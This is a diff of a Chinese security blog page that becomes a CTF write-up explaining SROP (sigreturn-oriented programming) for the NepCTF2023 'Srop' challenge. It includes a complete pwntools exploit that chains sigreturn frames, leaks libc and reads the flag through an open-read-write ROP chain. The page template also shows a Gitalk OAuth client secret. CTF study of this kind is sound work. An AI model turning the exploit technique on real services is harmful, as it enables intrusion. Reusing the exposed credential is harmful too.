@@ -111,10 +111,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://sagiring.github.io/archives/2023/03/archives/2/">
+  <link rel="canonical" href="https://sagiring.github.io/cn/SROP/">
   <title>
     
-      茗茗之中的blog
+      SROP - 茗茗之中的blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -219,9 +219,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/about/">
               
-              标签
+              关于
               
               
             </a>
@@ -252,9 +252,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/tags/">
               
-              分类
+              标签
               
               
             </a>
@@ -320,19 +320,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/my_love.png');
-      --intro-header-background-image-url-post: url('');
-      --intro-header-background-image-url-page: url('/img/header_img/my_love (8).png');
+      --intro-header-background-image-url-post: url('my_love1.png');
+      --intro-header-background-image-url-page: url('/my_love1.png');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/my_love.png');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/my_love (8).png');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('my_love1.png');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/my_love1.png');
     }
 
     header.intro-header {
-       /*page*/
-        background-image: var(--intro-header-background-image-url-page);
-        /* background-image: url('/img/header_img/my_love (8).png'); */
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('my_love1.png'); */
       
     }
 
@@ -350,10 +350,42 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>茗茗之中</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">人生苦短,及时行乐</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+              
+            </div>
+            <h1>SROP</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by 茗 on
+              2023-08-13
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">3</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">769</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
           </div>
           
         </div>
@@ -378,413 +410,363 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-		<!-- Main Content -->
-<div class="container">
-  <div class="row">
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+        
+
+        <h1 id="srop">SROP</h1>
+<h2 id="简单介绍">简单介绍</h2>
+<p><code>SROP</code>，即 Sigreturn Oriented Programming，正是利用了
+<code>Sigreturn</code> 机制的弱点，来进行攻击。</p>
+<p>在执行 <code>sigreturn</code> 系统调用的时候，不会对 signal
+做检查</p>
+<p><img src="/cn/SROP/spaces%2F-MGvsJHYreZx4FTJt1gV%2Fuploads%2Fgit-blob-127b55183cffd2ac45354931d57e715c335f1348%2F6.1.4_sigret.jpg"></p>
+<p>简单来说就是通过<code>sigreturn</code>的系统调用<code>0xf</code>的<code>syscall</code>，将所有寄存器恢复成预先设置好的样子。通过栈溢出设定，从而达成控制程序的目的。出内核态时候而<code>sigreturn</code>本身是用来恢复上下文的</p>
+<h2 id="nepctf2023-srop">NepCTF2023 Srop</h2>
+<p>先<code>checksec</code></p>
+<p><img src="/cn/SROP/image-20230813115015089.png"></p>
+<p><code>RELRO</code>全开
+<code>got</code>表不能改；<code>NX</code>开，栈不可执行</p>
+<p>题目给了<code>ld</code>和<code>libc</code>,设置一下</p>
+<pre><code class="hljs plaintext">patchelf --set-interpreter ld路径 ./pwn</code></pre>
+<pre><code class="hljs plaintext">patchelf --replace-needed libc.so.6 libc路径 ./pwn</code></pre>
+<pre><code class="hljs plaintext">ldd ./pwn</code></pre>
+<p>题目本身给的代码很简单</p>
+<p><img src="/cn/SROP/image-20230813115614859.png"></p>
+<p><img src="/cn/SROP/image-20230813115530879.png"></p>
+<p>一个简单的系统调用<code>read</code>栈溢出</p>
+<p>此处贴出常用系统调用</p>
+<table>
+<thead>
+<tr class="header">
+<th>函数</th>
+<th>调用号</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>read</code></td>
+<td>0</td>
+</tr>
+<tr class="even">
+<td><code>write</code></td>
+<td>1</td>
+</tr>
+<tr class="odd">
+<td><code>open</code></td>
+<td>2</td>
+</tr>
+<tr class="even">
+<td><code>rt_sigreturn</code></td>
+<td>0xf</td>
+</tr>
+<tr class="odd">
+<td><code>execve</code></td>
+<td>59</td>
+</tr>
+</tbody>
+</table>
+<p>同时注意到开了沙箱</p>
+<p><img src="/cn/SROP/image-20230813120434408.png"></p>
+<p>目标就明确了
+使用<code>srop</code>通过<code>orw</code>进行<code>flag</code>的读取</p>
+<p><img src="/cn/SROP/image-20230813120633751.png"></p>
+<p>看一下<code>syscall</code>对准一下寄存器</p>
+<p>贴出<code>exp</code></p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64
+
+
+debug = <span class="hljs-number">1</span>
+gdb_is = <span class="hljs-number">1</span>
+<span class="hljs-comment"># context(arch=&#x27;i386&#x27;,os = &#x27;linux&#x27;, log_level=&#x27;DEBUG&#x27;)</span>
+context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)
+<span class="hljs-keyword">if</span> debug:
+    context.terminal = [<span class="hljs-string">&#x27;/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe&#x27;</span>,<span class="hljs-string">&#x27;nt&#x27;</span>,<span class="hljs-string">&#x27;Ubuntu&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]
+    r = process(<span class="hljs-string">&quot;./pwn&quot;</span>)
     
+<span class="hljs-keyword">else</span>:
+    host = <span class="hljs-string">&quot;nepctf.1cepeak.cn&quot;</span>
+    r = connect(host,<span class="hljs-number">32552</span>)<span class="hljs-comment">#远程连接</span>
+    gdb_is =<span class="hljs-number">0</span>
 
-    <!-- USE SIDEBAR -->
-    <!-- Post Container -->
-    <div class="
-                col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+<span class="hljs-keyword">if</span> gdb_is:
+    <span class="hljs-comment"># gdb.attach(r,&#x27;b* 0x00401571&#x27;)</span>
+    gdb.attach(r)
+    pause()
+    <span class="hljs-keyword">pass</span>
 
-      <!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-0 col-md-10 col-md-offset-1">
-      <!-- 归档列表 -->
 
-      
 
-      <!-- 归档列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2023">
-          <span class="tag-text">2023</span>
-        </span>
-        <ul>
+elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)
+pop_rdi = <span class="hljs-number">0x000400813</span>
+pop_rsi_r15 = <span class="hljs-number">0x000400811</span>
+
+bss_addr = <span class="hljs-number">0x601050</span>
+base_addr = bss_addr + <span class="hljs-number">0x8</span>
+syscall_addr = elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]
+payload= <span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">48</span> + <span class="hljs-string">b&#x27;junkjunk&#x27;</span> 
+syscall_got = elf.got[<span class="hljs-string">&#x27;syscall&#x27;</span>]
+
+<span class="hljs-comment">#使用pwntools的SigreturnFrame()帮助构造结构体</span>
+frame_write = SigreturnFrame()
+frame_write.rdi = <span class="hljs-number">1</span>
+frame_write.rsi = <span class="hljs-number">1</span>
+frame_write.rdx = syscall_got <span class="hljs-comment">#泄露libc地址</span>
+frame_write.rcx = <span class="hljs-number">0x8</span>
+frame_write.rip = syscall_addr 
+frame_write.rsp = base_addr + <span class="hljs-number">0xF0</span> + <span class="hljs-number">0x8</span> * <span class="hljs-number">4</span> <span class="hljs-comment">#一个SigreturnFrame()大小0xF0 控制栈顶</span>
+
+frame_read_data = SigreturnFrame()
+frame_read_data.rdi = <span class="hljs-number">0</span> <span class="hljs-comment">#由于syscall之前对寄存器做了移位，所以不是rax</span>
+frame_read_data.rsi = <span class="hljs-number">0</span>
+frame_read_data.rdx = bss_addr
+frame_read_data.rcx = <span class="hljs-number">0x228</span>
+frame_read_data.rsp = base_addr <span class="hljs-comment">#由于不知道栈的地址，将其迁移到bss段进行控制</span>
+frame_read_data.rip = syscall_addr <span class="hljs-comment">#直接调用syscall运行设置的函数</span>
+
+
+payload +=  p64(pop_rdi)+ p64(<span class="hljs-number">0xf</span>) +p64(syscall_addr) + <span class="hljs-built_in">bytes</span>(frame_read_data) 
+r.send(payload)
+time.sleep(<span class="hljs-number">1</span>)
+
+<span class="hljs-comment">#----------------------------------------</span>
+
+frame_read_data = SigreturnFrame()
+frame_read_data.rdi = <span class="hljs-number">0</span> 
+frame_read_data.rsi = <span class="hljs-number">0</span>
+frame_read_data.rdx = bss_addr
+frame_read_data.rcx = <span class="hljs-number">0x8</span> * <span class="hljs-number">30</span>
+frame_read_data.rsp = base_addr  - <span class="hljs-number">0x8</span>
+frame_read_data.rip = syscall_addr
+
+payload_read = p64(pop_rdi)+ p64(<span class="hljs-number">0xf</span>) +p64(syscall_addr) + <span class="hljs-built_in">bytes</span>(frame_read_data) 
+
+payload = p64(<span class="hljs-number">0</span>) + p64(pop_rdi)+ p64(<span class="hljs-number">0xf</span>) +p64(syscall_addr) + <span class="hljs-built_in">bytes</span>(frame_write) + payload_read
+r.send(payload)
+<span class="hljs-comment">#泄露libc地址</span>
+<span class="hljs-comment">#----------------------------------------</span>
+libc_syscall_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+libc.address =  libc_syscall_addr - libc.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]
+info(<span class="hljs-string">f&#x27;libc_syscall_addr = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_syscall_addr)&#125;</span>&#x27;</span>)
+info(<span class="hljs-string">f&#x27;system = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])&#125;</span>&#x27;</span>)
+
+pop_rsi = <span class="hljs-number">0x00023a6a</span> + libc.address
+pop_rdx = <span class="hljs-number">0x000001b96</span> + libc.address
+syscall_addr = <span class="hljs-number">0x0011B537</span> + libc.address <span class="hljs-comment">#此处将syscall的移位去掉了</span>
+pop_rax = <span class="hljs-number">0x001b500</span>  + libc.address
+
+time.sleep(<span class="hljs-number">1</span>)
+<span class="hljs-comment">#ORW</span>
+payload = p64(pop_rdi) + p64(bss_addr + <span class="hljs-number">0x8</span> * <span class="hljs-number">25</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>)+ p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall_addr)
+<span class="hljs-comment">#0x00601009找的data段的地址</span>
+payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x00601009</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>)  + p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(syscall_addr)
+
+payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x00601009</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(syscall_addr)
+payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) 
+<span class="hljs-comment">#bss_addr + 0x8 * 25 是flag的位置</span>
+r.send(payload)
+r.interactive()
+</code></pre>
+<p><code>srop</code>控制后泄露<code>libc</code>地址，再使用<code>orw</code>打印出<code>flag</code>。</p>
+<p>泄露<code>libc</code>目的：</p>
+<p>泄露<code>libc</code>后可利用的<code>rop gadget</code>更多了，方便<code>orw</code></p>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
           
-          <li>
-            06-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/计算机网络学习/" style="color: #0085a1">
-              <span>
-                计算机网络学习
-                
-                -- cn
-                
-              </span>
-            </a>
+          <li class="previous">
+            <a href="/cn/堆知识合集一/" data-toggle="tooltip" data-placement="top" title="堆知识合集一">&larr; Previous Post</a>
           </li>
           
-          <li>
-            06-10
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/操作系统的二三事/" style="color: #0085a1">
-              <span>
-                操作系统的二三事
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
           
-          <li>
-            04-26
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/密码学的那些知识/" style="color: #0085a1">
-              <span>
-                密码学的那些知识
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/痛苦的环境配置/" style="color: #0085a1">
-              <span>
-                痛苦的环境配置
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-27
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/关于发呆/" style="color: #0085a1">
-              <span>
-                关于发呆
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-21
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/tcache题的亿点点细节/" style="color: #0085a1">
-              <span>
-                tcache题的亿点点细节
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/初识堆/" style="color: #0085a1">
-              <span>
-                初识堆
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/格式化字符串auto与LibcSearcher/" style="color: #0085a1">
-              <span>
-                格式化字符串auto与LibcSearcher
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-15
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/ORW/" style="color: #0085a1">
-              <span>
-                ORW
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-12
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/一些小细节/" style="color: #0085a1">
-              <span>
-                一些小细节
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-11
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/格式化字符串/" style="color: #0085a1">
-              <span>
-                格式化字符串
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-10
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/传参方式/" style="color: #0085a1">
-              <span>
-                传参方式
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-01
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/栈迁移的学习/" style="color: #0085a1">
-              <span>
-                栈迁移的学习
-                
-                -- cn
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            03-01
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/cn/杂七杂八/" style="color: #0085a1">
-              <span>
-                杂七杂八
-                
-                -- cn
-                
-              </span>
-            </a>
+          <li class="next">
+            <a href="/cn/计算机网络学习/" data-toggle="tooltip" data-placement="top" title="计算机网络学习">Next Post &rarr;</a>
           </li>
           
         </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=SROP&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/SROP/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+  <!-- gitalk start -->
+  <!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+  <div id="gitalk-container"></div>
+
+  
+    <!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+    <script src="/js/comment/gitalk.js"></script>
+  
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: 'd4759980b8c82fe1a32a',
+      clientSecret: '0e870d007deb9e146ba167987e446ea4f50dff34',
+      repo: 'Sagiring.github.io',
+      owner: 'Sagiring',
+      admin: 'Sagiring',
+      id: 'Sun Aug 13 2023 12:00:00 GMT+0800', // Ensure uniqueness and length less than 50
+      distractionFreeMode: false, // Facebook-like distraction free mode
+      perPage: 10,
+      pagerDirection: 'last',
+      createIssueManually: true,
+      language: 'zh-CN',
+      proxy: 'https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token'
+    });
+    gitalk.render('gitalk-container');
+
+    var gtFolded = () => {
+      setTimeout(function () {
+        let markdownBody = document.getElementsByClassName("markdown-body");
+        let list = Array.from(markdownBody);
+        list.forEach(item => {
+          if (item.clientHeight > 250) {
+            item.classList.add('gt-comment-body-folded');
+            item.style.maxHeight = '250px';
+            item.title = 'Click to Expand';
+            item.onclick = function () {
+              item.classList.remove('gt-comment-body-folded');
+              item.style.maxHeight = '';
+              item.title = '';
+              item.onclick = null;
+            };
+          }
+        })
+      }, 800);
+    }
+  </script>
+
+  <!-- gitalk end -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
       </div>
-      
-    </div>
-  </div>
-</div>
 
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
 
-      <!-- 如果开启评论功能 -->
-      
-    </div>
-
-    <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
     
-        <!-- Visitors -->
-<h5><a href="/">来访者</a></h5>
-
-<div class="widget">
-  <span>
-    Viewed <b><i><span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Times
-  </span>
-  <br />
-  <span>
-    <b><i><span id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></span></i></b> Visitors In Total
-  </span>
-</div>
-
-
-        <hr>
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#srop"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">SROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">简单介绍</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#nepctf2023-srop"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">NepCTF2023 Srop</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
     
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
         <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">特色标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+            
+          </div>
+        </section>
+        
 
-<section>
-  <h5><a href="/tags/">特色标签</a></h5>
-  <div class="tags">
-    
-    
-    <a href="/tags/#pwn" title="pwn" rel="10">pwn</a>
-    
-    
-    
-    <a href="/tags/#我" title="我" rel="1">我</a>
-    
-    
-    
-    <a href="/tags/#学科" title="学科" rel="3">学科</a>
-    
-    
-  </div>
-</section>
-
-
-        <hr>
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-  <h5><a href="/about/">关于自己</a></h5>
-  <div class="short-about">
-
-    
-    <img id="avatar_pic" src="/img/avatar/good_to_look.jpg" alt="avatar_pic" style="box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -moz-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -webkit-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);" />
-    
-
-    
-    <p>I don&#39;t know where I am going ,but I am on my way...</p>
-    
-
-    <!-- SNS Link -->
-    <ul class="list-inline">
-      
-
-      
-      <li>
-        <a target="_blank" href="https://github.com/Sagiring">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-    </ul>
-  </div>
-</section>
-
-        <hr>
-    
-        <!-- RECENT POSTS -->
-
-<h5><a href="/">最近博文</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="../../../../../cn/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/">
-      <li>计算机网络学习</li>
-    </a>
-    
-    <a href="../../../../../cn/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B/">
-      <li>操作系统的二三事</li>
-    </a>
-    
-    <a href="../../../../../cn/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E9%82%A3%E4%BA%9B%E7%9F%A5%E8%AF%86/">
-      <li>密码学的那些知识</li>
-    </a>
-    
-    <a href="../../../../../cn/%E7%97%9B%E8%8B%A6%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">
-      <li>痛苦的环境配置</li>
-    </a>
-    
-    <a href="../../../../../cn/%E5%85%B3%E4%BA%8E%E5%8F%91%E5%91%86/">
-      <li>关于发呆</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
         <!-- Friends Blog -->
-
-
-        <hr>
-    
-        <!-- Archives -->
-
-<h5><a href="/archives/">archives</a></h5>
-<div class="widget">
-  <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../../04/">April 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="../../">March 2023</a><span class="archive-list-count">11</span></li></ul>
-</div>
-
-
-        <hr>
-    
-        <!-- Categories -->
-
-<h5><a href="/categories/">categories</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="/categories/#pwn">
-      <li>pwn</li>
-    </a>
-    
-    <a href="/categories/#自己的知识">
-      <li>自己的知识</li>
-    </a>
-    
-    <a href="/categories/#密码学">
-      <li>密码学</li>
-    </a>
-    
-    <a href="/categories/#操作系统">
-      <li>操作系统</li>
-    </a>
-    
-    <a href="/categories/#计算机网络">
-      <li>计算机网络</li>
-    </a>
-    
-  </ul>
-</div>
-
-
-        <hr>
-    
-</div>
-
-
-    
+        
+      </div>
+    </div>
   </div>
-</div>
+</article>
+
+
+
+
+
 
 
 		<!-- Footer (contains ThemeColor、viewer) -->
